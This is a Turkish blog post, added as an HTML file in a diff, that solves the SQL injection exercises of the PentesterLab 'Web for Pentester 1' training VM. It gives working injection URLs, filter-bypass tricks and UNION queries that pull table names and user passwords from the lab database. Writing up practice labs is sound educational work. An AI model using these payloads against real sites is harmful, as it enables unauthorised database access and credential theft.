@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <!-- meta information -->
+<meta charset="utf-8">
+<meta name="description" 
+      content="      Web For Pentester yaygın Web zafiyetlerini bize sunan ve bu zafiyetlerden yararlanmaya çalışarak çözümlere ulaş..." >
+<meta name="author" content="7122016">
+
+<!-- Enable responsiveness on mobile devices-->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<!-- title -->
+<title>WEB For Pentester 1 - SQL Injections Bölümü Çözümleri &middot; </title>
+
+<!-- icons -->
+<link rel="shortcut icon" href="/public/images/favicon.ico" />
+
+<!-- stylesheets -->
+<link rel="stylesheet" href="/public/css/responsive.gs.12col.css">
+<link rel="stylesheet" href="/public/css/animate.min.css">
+<link rel="stylesheet" href="/public/css/main.css">
+
+<!-- Google fonts -->
+<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700,400italic&subset=latin-ext">
+
+
+
+<!-- feed links -->
+<link rel="alternate" href="http://localhost:4000/feed.xml" type="application/rss+xml" title="">
+
+  </head>
+  <body>
+    <div class="container azul">
+      <header class="top row gutters">
+        <div class="col span_2 center">
+          <!-- TODO: add baseurl to the logo link -->
+          <a href="http://localhost:4000" id="logo" title="7122016"
+             style="background-image: url(/public/images/);"></a>
+        </div>
+        <nav class="col span_10 top-navbar">
+  
+  <a href="/" title="Anasayfa"
+     >Anasayfa</a>
+  
+  <a href="/iletisim.html" title="Hakkında"
+     >Hakkında</a>
+  
+</nav>
+
+      </header>
+      <h2><center>Gönderiler</center></h2>
+      <article class="single row gutters">
+  <time class="published" datetime="2017-03-18">18 March 2017</time>
+  <h2>WEB For Pentester 1 - SQL Injections Bölümü Çözümleri</h2>
+
+  <p>      <strong>Web For Pentester</strong> yaygın Web zafiyetlerini bize sunan ve bu zafiyetlerden yararlanmaya çalışarak çözümlere ulaştığımız
+bir test sistemidir. Bu adresten bilgisayarınıza indirebilirsiniz.<a href="https://www.pentesterlab.com/exercises/web_for_pentester">https://www.pentesterlab.com/exercises/web_for_pentester</a>
+ISO kalıbı bilgisayarınıza indikten sonra Vmware,Virtual Machine gibi sanal makina sistemlerinden birine kurmanız gerekir. Kurulumdan sonra sanal makinenizdeki sistem de</p>
+
+<blockquote>
+  <blockquote>
+    <p><strong>»</strong>ifconfig</p>
+  </blockquote>
+</blockquote>
+
+<p>yazarak gördüğünüz IP adresini Ana makinenizdeki tarayıcınıza yazarak <strong>WFP</strong> sorularına ulaşabilirsiniz.
+Bu yazıda <strong>SQL Injections</strong> Bölümünün çözümlerini anlatmaya çalışacağız.Syntax yapısını sağlamak için gereken  URL encode karakterlerine şurayı ziyaret ederek ulaşabilirsiniz.
+<a href="https://www.w3schools.com/tags/ref_urlencode.asp">https://www.w3schools.com/tags/urlencode</a></p>
+
+<p><strong>Example 1</strong><br />
+      Soruda tırnak (‘) koyup deneme yaptığımızda ekranın bir hatadan dolayı değiştiğini görüyoruz. Buradan araya kod sıkıştırabileceğimizi anlıyoruz.  Örnek olarak arka tarafta çalışan sorgu:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. select id,name,age from users where name='root'
+</code></pre>
+</div>
+
+<p>Buraya şu ifadeyi eklediğimizde</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. select id,name,age from users where name='root' or 1 or''
+2. select id,name,age from users where 1 
+</code></pre>
+</div>
+
+<p>İkinci  duruma geldiğini düşünebiliriz. Bununla bütün değerleri çağırmış oluyoruz ve listeliyoruz.
+‘or 1 or’ ifadesini aşağıdaki gibi URL’ye eklediğimizde tüm tabloyu listeliyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example1.php?name=root'or 1 or'
+</code></pre>
+</div>
+
+<p>Burada çıkan kullanıcıları ve bilgileri görüyoruz. Örneğin user1 ile devam edelim. Buraya yazdığımız kelime sonucu etkilemez. Önümüzdeki tabloda kaç tane sütun olduğunu aşağıdaki komutla deneyerek buluyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example1.php?name=user1' order by 1 %23
+2. http://192.168.96.129/sqli/example1.php?name=user1' order by 2 %23
+3. http://192.168.96.129/sqli/example1.php?name=user1' order by 3 %23
+4. http://192.168.96.129/sqli/example1.php?name=user1' order by 4 %23
+5. http://192.168.96.129/sqli/example1.php?name=user1' order by 5 %23
+6. http://192.168.96.129/sqli/example1.php?name=user1' order by 6 %23
+</code></pre>
+</div>
+
+<p>Ve en son 6 da hata oluyor yani önümüze hiç bir şey çıkmıyor. Buradan 5 tane sütunumuz olduğunu anlıyoruz.<strong>‘%23’</strong> ifadesi de (#) anlamına geliyor yani sonrasında gelen ifadeleri yok sayıyor. Bu sayede syntax hatalarından kurtuluyoruz.
+Bu aşamadan sonra bilgi toplamaya başlıyoruz.İlk sütuna ve ikinci sütuna tablo ve versiyon bilgilerini bastırmak için bunu uyguluyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example1.php?name=user1' union select table_name,version(),3,4,5 
+from information_schema.tables %23
+</code></pre>
+</div>
+
+<p>Bütün Sütun isimleri için:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example1.php?name=user1' union select column_name,2,3,4,5 
+from information_schema.columns %23
+</code></pre>
+</div>
+
+<p>Tablo isimlerini normal yazarak hata alırsak onların hexadecimal karşılıklarını deneyerek sonuca ulaşabiliriz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example1.php?name=root' union select column_name,2,3,4,5 
+from information_schema.columns where table_name = 0x7573657273 %23
+</code></pre>
+</div>
+
+<p>Sırayla aşağıdaki işlemleri uygulayarak tablodaki kullanıcı şifrelerini bulmaya çalışalım.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example1.php?name=root' union select 
+database(),2,3,4,5 %23 --&gt; Kullanılan veri tabanının ismini çektiğimiz komut.
+
+2. http://192.168.96.129/sqli/example1.php?name=root' union select table_name,2,3,4,5 
+from information_schema.tables where 
+table_schema = database() %23 --&gt; Kullanılan tablonun adını çektiğimiz komut.
+
+3. http://192.168.96.129/sqli/example1.php?name=root' UNION SELECT 1,column_name,3,4,5 
+FROM information_schema.columns WHERE table_name="users" %23 --&gt; tablodaki sütunların 
+isimlerini çektiğimiz komut.
+
+4. http://192.168.96.129/sqli/example1.php?name=root' union select name,passwd,3,4,5 
+from exercises.users %23 --&gt; kullanıcı isimlerini ve şifrelerini çektiğimiz komut.
+</code></pre>
+</div>
+
+<p>Çeşitli komut varyasyonları ile farklı bilgiler edinebiliriz.</p>
+
+<p><strong>Example 2</strong><br />
+      1. Soruda denediğimiz ifadenin aynısını deniyoruz ve <strong>‘ERROR NO SPACE’</strong> yazısını görüyoruz. Buradan aralara
+koyduğumuz boşluk karakterinin sorun oluşturduğunu anlıyoruz.  Syntax yapısını sağlamak için boşluk yerine tab koyabiliriz. Tabiki Tab tuşuna basarak yapabildiğimiz bir olay değil. TAB karakteri <strong>‘%09’</strong> ile ifade edilir.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example2.php?name=root'or%091%09or'	
+</code></pre>
+</div>
+
+<p><strong>Example 3</strong><br />
+      ‘or 1 or’ denediğimizde  <strong> ‘ERROR NO SPACE’ </strong>. Sonrasında bir önceki sorudaki gibi  ‘or%091%09or’ deniyoruz fakat yine aynı sonuç : <strong>‘ERROR NO SPACE’</strong> . Boşluğa ve Tab’a izin vermiyor. Syntax yapısını sağlaması için boşluk benzeri birşey koyacağız ama ne boşluk olacak ne de tab. Biraz araştırma sonucu yorum satırı haline getirerek oralardaki karakter koyma ihtiyacından kurtuluyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example3.php?name=root'or/**/1/**/or
+</code></pre>
+</div>
+
+<p><strong>Example 4</strong><br />
+      URL’nin devamına ‘or 1 or’ denediğimizde bir sonuç alamıyoruz. Birkaç denemeden sonra tırnak karakteri kullanmamamız gerektiğini anlıyoruz ve yalnızca <strong>or 1</strong> yazarak sonuçlari listeliyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example4.php?id=2 or 1
+</code></pre>
+</div>
+
+<p><strong>Example 5</strong><br />
+      4. soruda olduğu gibi aynı işlemi uygulayınca sonucu listeliyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example5.php?id=2 or 1
+</code></pre>
+</div>
+
+<p><strong>Example 6</strong><br />
+      Tırnak koyup bir kontrol ediyoruz ve <strong>‘ERROR INTEGER REQUIRED’</strong> yazısını görüyoruz. İfademizi bir Integer ile bitirmek için  or 1  yazıyoruz .</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example6.php?id=2 or 1
+</code></pre>
+</div>
+
+<p><strong>Example 7</strong><br />
+      Tırnak karakteri koyduğumuzda <strong>‘ERROR INTEGER REQUIRED’</strong> yazısını görüyoruz. Bir önceki soruda olduğu gibi or 1 yazıp deniyoruz ama aynı hata devam ediyor. Burada integer isteyen yerin bizim ifademizden önce gelen yer olduğunu deneyerek buluyoruz.<strong>‘%0A’</strong> karakteri alt satıra geçme anlamına geliyor. Bunu kullanarak aşağıdaki ifade sonuçları listeliyor.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example7.php?id=2%0A or 1
+</code></pre>
+</div>
+
+<p><strong>Example 8</strong><br />
+      Burada <strong>order</strong> kelimesini görünce order yapısıyla ilgili sorgular göndermeye çalışıyoruz. Düz tırnak gönderdiğimizde bir sonuç alamıyoruz ve denemeler sonucu yatay tırnak(`) kullanıyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. `asc %23
+2. `desc %23
+3. ` %23
+</code></pre>
+</div>
+
+<p>ifadeleri işimizi görüyor.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example8.php?order=name`asc %23
+</code></pre>
+</div>
+
+<p><strong>Example 9</strong><br />
+      Düz tırnak ve yatay tırnak karakterleri hata veriyor ve bunları kullanmadan deneyerek sonuçları listeliyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. asc %23
+2. desc %23
+3. %23
+</code></pre>
+</div>
+
+<p>İfadelerinden herhangi biriyle sorgumuzu çalıştırıyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>1. http://192.168.96.129/sqli/example9.php?order=name desc %23
+</code></pre>
+</div>
+
+<p><br />
+      Böylelikle <strong>WEB For Pentester 1 SQL Injections</strong> bölümünün çözümünü tamamlamış olduk. Tüm sorular için aynı detaya inme gereği duymadık ilk sorudaki sorgulardan yola çıkarak aynı sonuçları elde edebilirsiniz.</p>
+
+
+</article>
+
+
+      <footer>
+        <p>
+          Tüm hakları <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/deed.en_US">Creative Commons Attribution-NonCommercial 4.0 International License</a>.
+	altında saklıdır.     
+   </p>
+      </footer>
+    </div>
+
+    <!-- scripts -->
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+    <script src="/public/js/jquery.fitvids.js"></script>
+    <script>
+      $(document).ready(function(){
+        $("article").fitVids();
+      });
+    </script>
+  </body>
+</html>
